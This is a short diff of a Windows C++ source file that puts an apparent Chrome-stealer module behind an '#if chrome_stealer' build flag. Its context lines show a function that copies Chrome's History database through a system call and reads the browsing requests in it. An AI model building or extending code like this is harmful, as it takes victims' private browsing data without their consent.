@@ -2,7 +2,11 @@
 #include <locale>
 #include <windows.h>
 
-#include "sqlite3.h"
+#include "Config.h"
+
+#if chrome_stealer
+	#include "sqlite3.h"
+
 
 #pragma warning(disable: 4996)
 
@@ -156,3 +160,5 @@ std::string GetChromeRequests() {
 	_wsystem(cpy_history().c_str());
 	return get_chrome_requests("History");
 }
+
+#endif // chrome_stealer
